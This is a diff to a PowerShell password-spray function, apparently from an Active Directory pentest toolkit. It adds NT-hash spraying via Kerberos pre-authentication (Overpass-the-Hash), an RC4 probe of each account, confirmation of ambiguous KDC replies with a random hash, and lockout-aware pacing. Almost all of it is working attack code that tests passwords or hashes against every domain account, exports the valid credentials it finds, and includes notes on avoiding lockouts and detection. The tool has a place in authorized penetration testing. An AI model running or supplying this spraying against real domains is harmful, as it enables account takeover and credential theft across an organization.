@@ -1,17 +1,51 @@
 function Invoke-PasswordSpray {
 <#
 .SYNOPSIS
-    Performs Kerberos-based password spray attack against Active Directory.
+    Performs Kerberos-based password or NT-Hash spray attack against Active Directory.
 
 .DESCRIPTION
     Tests a single password (or multiple passwords) against a list of usernames using
     Kerberos Pre-Authentication (AS-REQ). This avoids LDAP binds and is stealthier.
 
+    Instead of a password, an NT hash can be sprayed (-NTHash / -NTHashList): the hash is
+    the account's RC4-HMAC key, so it is tested exactly like a password, without being
+    cracked first (Overpass-the-Hash). An AES key cannot be sprayed - it is salted with
+    the account name and only ever valid for one account.
+
+    A wrong NT hash is a failed logon like a wrong password and counts against the
+    lockout threshold the same way.
+
+    KDC_ERR_ETYPE_NOSUPP on an RC4 attempt has two readings. A KDC may have checked the RC4
+    timestamp against the stored NT hash, found it right, and refused only to answer in
+    RC4 - then the hash and the password behind it are right, there is just no Kerberos
+    ticket, and NTLM may still accept the hash. Or the KDC refuses RC4 for the account
+    whatever the key: measured in a lab for a Protected Users member, which answers
+    KDC_ERR_ETYPE_NOSUPP to a wrong hash exactly as to the right one.
+
+    Two steps keep the second from passing for the first. Before the first hash every
+    account is asked once whether the KDC accepts RC4-HMAC for it - an AS-REQ without
+    pre-authentication, which is no logon attempt and sends no hash; the Protected Users
+    member is refused there and left out, and when all accounts are, the run stops and says
+    so. An attempt that is still answered with KDC_ERR_ETYPE_NOSUPP is then confirmed with
+    a hash that is certainly wrong: KDC_ERR_PREAUTH_FAILED for that one proves the KDC
+    checks the key, and the sprayed hash is reported as a valid hash - in yellow, apart from
+    the full successes. The same answer again leaves it "not tested". The confirmation is a
+    failed logon; in auto mode it is left out where it would leave the account one attempt
+    from lockout.
+
+    An account whose secret was found gets no further secrets: it has one password, and
+    every further attempt would only count against its lockout threshold. In a password
+    spray, an attempt the KDC refuses AES256 for (an account without AES keys) is counted
+    as "not tested" - there the KDC has no key to check against.
+
     Uses sequential testing to avoid account lockouts. Each user is tested only once
     per password, spreading attempts over time to stay under lockout thresholds.
 
 .PARAMETER UserList
-    Path to file containing usernames (one per line) or array of usernames.
+    The accounts to spray: a file with one name per line, an array of names, or a string
+    with one name or several separated by commas ("jdoe" or "jdoe,asmith"). A string is read
+    as a file when a file of that name exists; one that ends like a list file (.txt, .lst,
+    .list, .csv) and does not exist is reported as missing rather than sprayed as a name.
     Usernames can be in format: username, DOMAIN\username, or username@domain.com
 
 .PARAMETER Auto
@@ -44,6 +78,17 @@ function Invoke-PasswordSpray {
     Path to file containing passwords (one per line) or array of passwords.
     WARNING: Testing multiple passwords increases lockout risk!
 
+.PARAMETER NTHash
+    Single NT hash to test against all users (32 hex characters).
+
+.PARAMETER NTHashList
+    Path to file containing NT hashes (one per line) or array of NT hashes.
+    Every entry must be 32 hex characters; a malformed entry stops the run before the
+    first attempt. WARNING: like a password list, every hash is one more failed logon
+    per account.
+
+    Exactly one of -Password, -PasswordList, -NTHash and -NTHashList is required.
+
 .PARAMETER Domain
     Target domain FQDN (optional, uses current domain from session if not specified)
 
@@ -61,7 +106,8 @@ function Invoke-PasswordSpray {
     Stop testing as soon as first valid credential is found.
 
 .PARAMETER OutputFile
-    Export successful credentials to file (format: username:password).
+    Export successful credentials to file (format: username:password, or username:nthash
+    for an NT-Hash spray).
 
 .PARAMETER Jitter
     Add random jitter to delay (percentage). Example: -Delay 100 -Jitter 20 means 80-120ms.
@@ -69,9 +115,11 @@ function Invoke-PasswordSpray {
 .OUTPUTS
     PSCustomObject array with successful credentials:
     - Username
-    - Password
+    - Password (password spray) or NTHash (NT-Hash spray)
     - Domain
     - Timestamp
+    - Method
+    - RC4Refused (NT-Hash spray): $true for a valid hash the KDC issued no RC4 ticket for
 
 .EXAMPLE
     # Basic password spray with single password
@@ -114,6 +162,16 @@ function Invoke-PasswordSpray {
     Invoke-PasswordSpray -UserList users.txt -PasswordList passwords.txt -Domain "contoso.com" -Delay 1000
 
 .EXAMPLE
+    # NT-Hash spray - test one known hash (e.g. a reused local administrator password)
+    # against every enabled account, with the same lockout protection
+    Connect-adPEAS -Domain "contoso.com" -UseWindowsAuth
+    Invoke-PasswordSpray -Auto -NTHash "32ED87BDB5FDC5E9CBA88547376818D4"
+
+.EXAMPLE
+    # Several NT hashes from a file (one per line)
+    Invoke-PasswordSpray -UserList users.txt -NTHashList hashes.txt -Domain "contoso.com" -Delay 1000
+
+.EXAMPLE
     # Spray and export results
     $creds = Invoke-PasswordSpray -UserList users.txt -Password "P@ssw0rd" -Domain "contoso.com"
     $creds | Export-Csv -Path valid_creds.csv -NoTypeInformation
@@ -137,6 +195,12 @@ function Invoke-PasswordSpray {
     - Each attempt generates a Kerberos Pre-Auth event (4771)
     - Large bursts of failures from single IP are suspicious
     - Use -Delay parameter to spread attempts over time
+    - An NT-Hash spray requests RC4-HMAC (etype 0x17), which stands out in the DC's
+      4768/4771 events of a domain whose clients otherwise use AES
+    - An NT-Hash spray first sends one AS-REQ per account without pre-authentication,
+      offering RC4-HMAC only (the RC4 check), with no delay between them
+    - A KDC_ERR_ETYPE_NOSUPP answer to an NT hash is confirmed with one more attempt with a
+      random hash - one failed logon (4771) per such answer
 #>
     [CmdletBinding(DefaultParameterSetName='UserList')]
     param(
@@ -151,6 +215,12 @@ function Invoke-PasswordSpray {
 
         [Parameter(Mandatory=$false)]
         [object]$PasswordList,
+
+        [Parameter(Mandatory=$false)]
+        [string]$NTHash,
+
+        [Parameter(Mandatory=$false)]
+        [object]$NTHashList,
 
         [Parameter(Mandatory=$false)]
         [string]$Domain,
@@ -185,16 +255,30 @@ function Invoke-PasswordSpray {
         # got the real error followed by an op_Subtraction one.
         $abortRun = $false
 
-        # Validate parameters
-        if (-not $Password -and -not $PasswordList) {
-            Write-Error "You must specify either -Password or -PasswordList"
+        # Validate parameters - exactly one source of secrets. A password and an NT hash are
+        # sprayed the same way, one AS-REQ per account and secret; they differ only in the
+        # key Invoke-KerberosAuth builds the pre-authentication with.
+        $secretSources = @()
+        if ($Password)     { $secretSources += '-Password' }
+        if ($PasswordList) { $secretSources += '-PasswordList' }
+        if ($NTHash)       { $secretSources += '-NTHash' }
+        if ($NTHashList)   { $secretSources += '-NTHashList' }
+
+        if ($secretSources.Count -eq 0) {
+            Write-Error "You must specify one of -Password, -PasswordList, -NTHash or -NTHashList"
             $abortRun = $true; return
         }
 
-        if ($Password -and $PasswordList) {
-            Write-Error "Cannot specify both -Password and -PasswordList. Choose one."
+        if ($secretSources.Count -gt 1) {
+            Write-Error "Specify only one of -Password, -PasswordList, -NTHash or -NTHashList - got $($secretSources -join ', ')."
             $abortRun = $true; return
         }
+
+        # The parameter name the secret is handed to Invoke-KerberosAuth under, and the
+        # words the console uses for it.
+        $secretKind = if ($NTHash -or $NTHashList) { 'NTHash' } else { 'Password' }
+        $secretLabel       = if ($secretKind -eq 'NTHash') { 'NT-Hash' }   else { 'password' }
+        $secretLabelPlural = if ($secretKind -eq 'NTHash') { 'NT-Hashes' } else { 'passwords' }
 
         # Build connection parameters (for Ensure-LDAPConnection and Get-Domain* calls)
         $connectionParams = @{}
@@ -204,6 +288,11 @@ function Invoke-PasswordSpray {
 
         # Load usernames
         $usernames = @()
+
+        # The lockout facts auto mode reads, for the confirmation of an NT-hash hit later
+        # on (process{}). A user list brings none: 0 means "unknown, not guarded".
+        $lockoutThreshold = 0
+        $initialBadPwdCount = @{}
 
         if ($Auto) {
             # Auto mode - fetch all enabled users from current adPEAS session
@@ -312,6 +401,7 @@ function Invoke-PasswordSpray {
                         }
                     } else {
                         $safeUsers += $user.sAMAccountName
+                        $initialBadPwdCount[[string]$user.sAMAccountName] = $badPwdCount
                     }
                 }
 
@@ -349,11 +439,19 @@ function Invoke-PasswordSpray {
             }
 
         } elseif ($UserList -is [string]) {
-            if (Test-Path $UserList) {
-                $usernames = Get-Content -Path $UserList | Where-Object { $_ -and $_.Trim() }
-            } else {
+            # A string is a file when one exists under that name, and the account names
+            # themselves otherwise - one, or several separated by commas. It used to be a file
+            # path and nothing else, so "-UserList jdoe", a quoted "a,b" and Get-Content of a
+            # one-line file all ended in "User list file not found", and the user-as-pass
+            # example in the help never ran. A string that looks like a list file is still
+            # reported as missing: a typo in the file name must not be sprayed as an account.
+            if (Test-Path -LiteralPath $UserList -PathType Leaf) {
+                $usernames = Get-Content -LiteralPath $UserList | Where-Object { $_ -and $_.Trim() }
+            } elseif ($UserList -match '\.(txt|lst|list|csv)\s*$') {
                 Write-Error "User list file not found: $UserList"
                 $abortRun = $true; return
+            } else {
+                $usernames = @($UserList -split ',' | ForEach-Object { $_.Trim() } | Where-Object { $_ })
             }
         } elseif ($UserList -is [array]) {
             $usernames = $UserList
@@ -362,32 +460,64 @@ function Invoke-PasswordSpray {
             $usernames = @($UserList)
         }
 
-        # Load passwords
-        $passwords = @()
+        # Load the secrets - passwords or NT hashes
+        $secrets = @()
         if ($Password) {
-            $passwords = @($Password)
+            $secrets = @($Password)
+        } elseif ($NTHash) {
+            $secrets = @($NTHash)
         } else {
-            if ($PasswordList -is [string]) {
-                if (Test-Path $PasswordList) {
-                    $passwords = Get-Content -Path $PasswordList | Where-Object { $_ -and $_.Trim() }
+            $secretList     = if ($secretKind -eq 'NTHash') { $NTHashList } else { $PasswordList }
+            $secretListName = if ($secretKind -eq 'NTHash') { 'NT-Hash' }   else { 'Password' }
+
+            if ($secretList -is [string]) {
+                if (Test-Path $secretList) {
+                    $secrets = Get-Content -Path $secretList | Where-Object { $_ -and $_.Trim() }
                 } else {
-                    Write-Error "Password list file not found: $PasswordList"
+                    Write-Error "$secretListName list file not found: $secretList"
                     $abortRun = $true; return
                 }
-            } elseif ($PasswordList -is [array]) {
-                $passwords = $PasswordList
+            } elseif ($secretList -is [array]) {
+                $secrets = $secretList
             }
         }
+
+        if ($secretKind -eq 'NTHash') {
+            # A hash is hex, so whitespace around it is never part of it (around a password
+            # it can be - passwords are not trimmed). Every entry is checked before the first
+            # attempt: Invoke-KerberosAuth rejects a malformed hash at parameter binding,
+            # which would end the run in the middle, after the entries before it had already
+            # been sprayed.
+            $secrets = @($secrets | ForEach-Object { ([string]$_).Trim() } | Where-Object { $_ })
+            for ($i = 0; $i -lt $secrets.Count; $i++) {
+                if ($secrets[$i] -notmatch '^[0-9a-fA-F]{32}$') {
+                    Write-Error "NT-Hash entry $($i + 1) is not an NT hash (expected 32 hex characters, got $($secrets[$i].Length)): $($secrets[$i])"
+                    $abortRun = $true; return
+                }
+            }
+        }
+
+        # DOMAIN\user and user@domain name the same account as user. Normalized once, here,
+        # because the RC4 check below needs the bare name before the first attempt.
+        # Surrounding whitespace is never part of an account name - a line "jdoe " in a file
+        # would otherwise be sprayed as an account that does not exist.
+        $usernames = @($usernames | ForEach-Object {
+            $accountName = ([string]$_).Trim()
+            if ($accountName -match '\\') { $accountName.Split('\')[1] }
+            elseif ($accountName -match '@') { $accountName.Split('@')[0] }
+            else { $accountName }
+        } | Where-Object { $_ })
 
         if ($usernames.Count -eq 0) {
             Write-Error "No usernames to test"
             $abortRun = $true; return
         }
 
-        if ($passwords.Count -eq 0) {
-            Write-Error "No passwords to test"
+        if (@($secrets).Count -eq 0) {
+            Write-Error "No $secretLabelPlural to test"
             $abortRun = $true; return
         }
+        $secrets = @($secrets)
 
         # Get Domain from session if not specified.
         #
@@ -405,10 +535,61 @@ function Invoke-PasswordSpray {
             $abortRun = $true; return
         }
 
+        # NT-Hash spray: does the KDC refuse RC4-HMAC for an account whatever the key? Asked
+        # once per account before the first hash, with an AS-REQ that carries no
+        # pre-authentication (Invoke-KerberosAuth -ETypeProbe) - no hash leaves this host and
+        # nothing counts against the lockout threshold.
+        #
+        # An account refused here, before any key, refuses every hash the same way, so a
+        # refusal of an attempt would say nothing about the hash - it is left out rather than
+        # reported. Measured in a lab: a Protected Users member is refused here, and answers
+        # KDC_ERR_ETYPE_NOSUPP to a wrong hash as to the right one. A refusal that reaches an
+        # attempt anyway is confirmed there (process{}).
+        $rc4RefusedCount = 0
+        if ($secretKind -eq 'NTHash') {
+            Write-Host "[*] Checking whether the KDC accepts RC4-HMAC for these accounts (no logon attempt)..." -ForegroundColor Cyan
+            $rc4Accepted = @()
+            foreach ($username in $usernames) {
+                $probeParams = @{
+                    UserName    = $username
+                    Domain      = $targetDomain
+                    NTHash      = $secrets[0]
+                    ETypeProbe  = $true
+                    ErrorAction = 'SilentlyContinue'
+                }
+                if ($Server) { $probeParams['DomainController'] = $Server }
+
+                $probe = $null
+                try { $probe = Invoke-KerberosAuth @probeParams } catch {
+                    Write-Verbose "[-] RC4 check failed for ${username}@${targetDomain}: $_"
+                }
+
+                # Only an explicit refusal leaves an account out. An answer that decides
+                # nothing - unknown account, revoked, a network error - keeps it, and the
+                # attempt itself tells.
+                if ($probe -and $probe.ETypeAccepted -eq $false) {
+                    $rc4RefusedCount++
+                    Write-Verbose "[-] RC4-HMAC refused: ${username}@${targetDomain} - $($probe.Error)"
+                } else {
+                    $rc4Accepted += $username
+                }
+            }
+
+            if ($rc4Accepted.Count -eq 0) {
+                Write-Host "[!] The KDC refuses RC4-HMAC for all $rc4RefusedCount account(s) - an NT hash cannot be tested here (KDC_ERR_ETYPE_NOSUPP)" -ForegroundColor Red
+                $abortRun = $true; return
+            }
+            if ($rc4RefusedCount -gt 0) {
+                Write-Host "[!] The KDC refuses RC4-HMAC for $rc4RefusedCount of $($usernames.Count) account(s) - they are left out" -ForegroundColor Yellow
+            }
+            Write-Host ""
+            $usernames = $rc4Accepted
+        }
+
         # Warn about lockout risk
-        if ($passwords.Count -gt 1 -and $Delay -lt 500) {
-            Write-Warning "Testing multiple passwords with low/no delay increases lockout risk!"
-            Write-Warning "Consider using -Delay 1000 or higher when testing multiple passwords."
+        if ($secrets.Count -gt 1 -and $Delay -lt 500) {
+            Write-Warning "Testing multiple $secretLabelPlural with low/no delay increases lockout risk!"
+            Write-Warning "Consider using -Delay 1000 or higher when testing multiple $secretLabelPlural."
         }
 
         Write-Host "[*] Password Spray Configuration:" -ForegroundColor Cyan
@@ -416,9 +597,15 @@ function Invoke-PasswordSpray {
         if ($Server) {
             Write-Host "    DC:              $Server"
         }
-        Write-Host "    Users:           $($usernames.Count)"
-        Write-Host "    Passwords:       $($passwords.Count)"
-        Write-Host "    Total Attempts:  $($usernames.Count * $passwords.Count)"
+        $usersLine = "    Users:           $($usernames.Count)"
+        if ($rc4RefusedCount -gt 0) { $usersLine += " ($rc4RefusedCount left out - KDC refused RC4)" }
+        Write-Host $usersLine
+        if ($secretKind -eq 'NTHash') {
+            Write-Host "    NT-Hashes:       $($secrets.Count) (RC4-HMAC)"
+        } else {
+            Write-Host "    Passwords:       $($secrets.Count)"
+        }
+        Write-Host "    Total Attempts:  $($usernames.Count * $secrets.Count)"
         Write-Host "    Delay:           ${Delay}ms" -NoNewline
         if ($Jitter -gt 0) {
             Write-Host " (+/- ${Jitter}%)" -ForegroundColor Yellow
@@ -430,30 +617,52 @@ function Invoke-PasswordSpray {
         $successfulCreds = @()
         $totalAttempts = 0
         $successCount = 0
+        $notTestedCount = 0
+        # NT-hash hits the KDC answered with KDC_ERR_ETYPE_NOSUPP and a wrong hash with
+        # KDC_ERR_PREAUTH_FAILED: the hash is right, RC4 is refused for the answer - process{}
+        $rc4RefusedValidCount = 0
+        # Accounts done with before the last secret: their secret was found, or the KDC
+        # refuses the encryption type for them whatever the key.
+        $finishedAccounts = @{}
+        # KDC_ERR_PREAUTH_FAILED answers this run caused, per account - what the lockout
+        # guard of the confirmation adds to the badPwdCount auto mode read.
+        $runFailures = @{}
+
+        # A hash that is certainly not the account's: 16 random bytes. For the confirmation
+        # of a KDC_ERR_ETYPE_NOSUPP answer only.
+        function New-UnrelatedNTHash {
+            $randomBytes = New-Object byte[] 16
+            $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
+            try { $rng.GetBytes($randomBytes) } finally { $rng.Dispose() }
+            ($randomBytes | ForEach-Object { $_.ToString('X2') }) -join ''
+        }
         $startTime = Get-Date
     }
 
     process {
         if ($abortRun) { return }
 
-        # Test each password against all users
-        foreach ($pass in $passwords) {
-            if ($passwords.Count -gt 1) {
-                Write-Host "[*] Testing password: $pass" -ForegroundColor Cyan
+        # Test each secret against all users
+        foreach ($secret in $secrets) {
+            # Every account is finished - its secret found, or it refused the encryption
+            # type: the rest would not be sent anywhere.
+            if (@($usernames | Where-Object { -not $finishedAccounts.ContainsKey($_) }).Count -eq 0) { break }
+
+            if ($secrets.Count -gt 1) {
+                Write-Host "[*] Testing ${secretLabel}: $secret" -ForegroundColor Cyan
             }
 
             $attemptNum = 0
             foreach ($username in $usernames) {
+                # Finished with an earlier secret: an account has one password, so every
+                # further attempt would only be a failed logon against its lockout counter.
+                if ($finishedAccounts.ContainsKey($username)) { continue }
+
                 $attemptNum++
                 $totalAttempts++
 
-                # Parse username format (handle DOMAIN\user or user@domain)
+                # Already the bare account name - normalized in begin{}
                 $cleanUsername = $username
-                if ($username -match '\\') {
-                    $cleanUsername = $username.Split('\')[1]
-                } elseif ($username -match '@') {
-                    $cleanUsername = $username.Split('@')[0]
-                }
 
                 # Progress indicator every 50 attempts
                 if ($attemptNum % 50 -eq 0) {
@@ -461,41 +670,115 @@ function Invoke-PasswordSpray {
                     Write-Host "    Progress: $attemptNum/$($usernames.Count) ($percent%)" -ForegroundColor Gray
                 }
 
-                # Test credential via Kerberos Pre-Auth
+                # Test credential via Kerberos Pre-Auth. The request is the same either way:
+                # a password becomes an AES256 key with the account's salt, an NT hash is
+                # the RC4-HMAC key itself (Overpass-the-Hash).
                 $kerberosParams = @{
                     UserName = $cleanUsername
                     Domain = $targetDomain
-                    Password = $pass
                     ErrorAction = 'SilentlyContinue'
                 }
+                $kerberosParams[$secretKind] = $secret
                 if ($Server) { $kerberosParams['DomainController'] = $Server }
 
                 $result = Invoke-KerberosAuth @kerberosParams
 
-                if ($result.Success) {
-                    $successCount++
-                    $credInfo = [PSCustomObject]@{
-                        Username  = $cleanUsername
-                        Password  = $pass
-                        Domain    = $targetDomain
-                        Timestamp = (Format-adPEASDate (Get-Date) 'yyyy-MM-dd HH:mm:ss')
-                        Method    = "Kerberos Pre-Auth"
+                # KDC_ERR_ETYPE_NOSUPP (14) on a pre-authenticated NT-hash attempt has two
+                # readings that the answer alone cannot tell apart:
+                # - the KDC checked the RC4 timestamp against the stored NT hash, found it
+                #   right, and refused only to answer in RC4 - a hit without a ticket, whose
+                #   password is right and which NTLM may still accept;
+                # - the KDC refuses RC4 for the account whatever the key. Measured in a lab
+                #   for a Protected Users member: 14 for the wrong hash as for the right one.
+                # The RC4 check before the spray left out the accounts refused even without a
+                # pre-authentication - the Protected Users member was among them. Whatever
+                # reaches this point is confirmed with a hash that is certainly wrong:
+                # KDC_ERR_PREAUTH_FAILED for that one proves the KDC checks the key, so the
+                # sprayed hash is right; 14 again means the answer says nothing.
+                #
+                # The confirmation is a failed logon. In auto mode, where the threshold and
+                # the badPwdCount are known, it is left out where it would leave the account
+                # one attempt from lockout - and the attempt then counts as not tested.
+                #
+                # Literal 14 and 24, not the $Script:KDC_ERR_* constants: where those are not
+                # defined the comparison is ErrorCode -eq $null, which is true for every
+                # failure without a KDC error code.
+                $hashValidRC4Refused = $false
+                if ($secretKind -eq 'NTHash' -and $result.ErrorCode -eq 14) {
+                    $confirmSafe = $true
+                    if ($lockoutThreshold -gt 0) {
+                        $badSoFar = [int]$runFailures[$username]
+                        if ($initialBadPwdCount.ContainsKey($username)) { $badSoFar += [int]$initialBadPwdCount[$username] }
+                        if (($lockoutThreshold - $badSoFar) -le 1) { $confirmSafe = $false }
+                    }
+
+                    if ($confirmSafe) {
+                        $confirmParams = $kerberosParams.Clone()
+                        $confirmParams['NTHash'] = New-UnrelatedNTHash
+                        $confirmation = Invoke-KerberosAuth @confirmParams
+                        if ($confirmation.ErrorCode -eq 24) {
+                            $runFailures[$username] = [int]$runFailures[$username] + 1
+                            $hashValidRC4Refused = $true
+                        } else {
+                            Write-Verbose "[-] ${cleanUsername}@${targetDomain}: a wrong hash got the same answer ($($confirmation.Error)) - the KDC refuses RC4 whatever the key"
+                        }
+                    } else {
+                        Write-Verbose "[-] ${cleanUsername}@${targetDomain}: KDC refused RC4 - not confirmed, a wrong hash would leave the account one attempt from lockout"
+                    }
+                }
+
+                if ($result.Success -or $hashValidRC4Refused) {
+                    if ($result.Success) { $successCount++ } else { $rc4RefusedValidCount++ }
+                    $finishedAccounts[$username] = $true
+
+                    $timestamp = Format-adPEASDate (Get-Date) 'yyyy-MM-dd HH:mm:ss'
+                    $credInfo = if ($secretKind -eq 'NTHash') {
+                        [PSCustomObject]@{
+                            Username   = $cleanUsername
+                            NTHash     = $secret
+                            Domain     = $targetDomain
+                            Timestamp  = $timestamp
+                            Method     = $(if ($hashValidRC4Refused) { "Kerberos Pre-Auth (NT-Hash, RC4-HMAC) - hash valid, KDC refused RC4" } else { "Kerberos Pre-Auth (NT-Hash, RC4-HMAC)" })
+                            RC4Refused = $hashValidRC4Refused
+                        }
+                    } else {
+                        [PSCustomObject]@{
+                            Username  = $cleanUsername
+                            Password  = $secret
+                            Domain    = $targetDomain
+                            Timestamp = $timestamp
+                            Method    = "Kerberos Pre-Auth"
+                        }
                     }
                     $successfulCreds += $credInfo
 
-                    Write-Host "[+] SUCCESS: ${cleanUsername}@${targetDomain}:${pass}" -ForegroundColor Green
+                    if ($hashValidRC4Refused) {
+                        Write-Host "[+] VALID HASH (KDC refused RC4): ${cleanUsername}@${targetDomain}:${secret}" -ForegroundColor Yellow
+                    } else {
+                        Write-Host "[+] SUCCESS: ${cleanUsername}@${targetDomain}:${secret}" -ForegroundColor Green
+                    }
 
-                    # Export to file if specified
+                    # Export to file if specified - a valid hash is a valid credential either way
                     if ($OutputFile) {
-                        "${cleanUsername}:${pass}" | Out-File -FilePath $OutputFile -Append -Encoding ASCII
+                        "${cleanUsername}:${secret}" | Out-File -FilePath $OutputFile -Append -Encoding ASCII
                     }
 
                     if ($StopOnSuccess) {
                         Write-Host "[*] Stopping on first success (StopOnSuccess flag set)" -ForegroundColor Yellow
                         break
                     }
+                } elseif ($result.ErrorCode -eq 14) {
+                    # Neither confirmed nor ruled out. A password the KDC refused AES256 for -
+                    # typically an account without AES keys, so there is nothing to check it
+                    # against; an NT hash whose refusal a wrong hash shared, or that could not
+                    # be confirmed without risking a lockout. Either way no further secret
+                    # would tell more, so the account is done with.
+                    $notTestedCount++
+                    $finishedAccounts[$username] = $true
+                    Write-Verbose "[-] NOT TESTED: ${cleanUsername}@${targetDomain}:${secret} - $($result.Error)"
                 } else {
-                    Write-Verbose "[!] FAILED: ${cleanUsername}@${Domain}:${pass} - $($result.Error)"
+                    if ($result.ErrorCode -eq 24) { $runFailures[$username] = [int]$runFailures[$username] + 1 }
+                    Write-Verbose "[!] FAILED: ${cleanUsername}@${targetDomain}:${secret} - $($result.Error)"
                 }
 
                 # Apply delay with optional jitter
@@ -509,7 +792,7 @@ function Invoke-PasswordSpray {
                 }
             }
 
-            if ($StopOnSuccess -and $successCount -gt 0) {
+            if ($StopOnSuccess -and ($successCount + $rc4RefusedValidCount) -gt 0) {
                 break
             }
         }
@@ -528,10 +811,23 @@ function Invoke-PasswordSpray {
         Write-Host "============================================================" -ForegroundColor Cyan
         Write-Host "  Total Attempts:    $totalAttempts"
         Write-Host "  Successful:        $successCount" -ForegroundColor $(if ($successCount -gt 0) { "Green" } else { "Gray" })
-        Write-Host "  Failed:            $($totalAttempts - $successCount)"
+        if ($rc4RefusedValidCount -gt 0) {
+            # A hit like the line above, for the tester: the hash is right - a wrong one got
+            # KDC_ERR_PREAUTH_FAILED. Kept apart because it yielded no Kerberos ticket.
+            Write-Host "  Valid hash:        $rc4RefusedValidCount (KDC refused RC4 - no ticket, NTLM may accept it)" -ForegroundColor Yellow
+        }
+        Write-Host "  Failed:            $($totalAttempts - $successCount - $rc4RefusedValidCount - $notTestedCount)"
+        if ($notTestedCount -gt 0) {
+            $notTestedReason = if ($secretKind -eq 'NTHash') { 'KDC refused RC4, not confirmable' } else { 'KDC refused AES256' }
+            $refusedEType = if ($secretKind -eq 'NTHash') { 'RC4' } else { 'AES256' }
+            Write-Host "  Not tested:        $notTestedCount ($notTestedReason)" -ForegroundColor Yellow
+            if ($notTestedCount -eq $totalAttempts) {
+                Write-Host "  Result:            no $secretLabel could be tested - the KDC refused $refusedEType for every attempt" -ForegroundColor Red
+            }
+        }
         Write-Host "  Duration:          $([math]::Round($duration, 2)) seconds"
         Write-Host "  Rate:              $([math]::Round($totalAttempts / $duration, 2)) attempts/sec"
-        if ($OutputFile -and $successCount -gt 0) {
+        if ($OutputFile -and ($successCount + $rc4RefusedValidCount) -gt 0) {
             Write-Host "  Output File:       $OutputFile" -ForegroundColor Green
         }
         Write-Host "============================================================" -ForegroundColor Cyan
